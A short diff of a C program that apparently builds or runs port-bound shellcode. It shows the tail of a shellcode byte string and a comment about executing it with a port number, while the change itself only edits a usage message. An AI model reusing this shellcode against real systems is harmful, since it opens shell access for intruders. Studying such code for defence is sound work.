@@ -17,7 +17,7 @@ int main(int argc, char* argv[]) {
 	    "\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
     if (argc <= 1) {
-        printf("Usage: %s <port>\n\n", argv[0]);
+        printf("[!] Usage: %s <port>\n\n", argv[0]);
         return -1;
     }
     // provide binary form for port in order to be able to execute with shellcode  
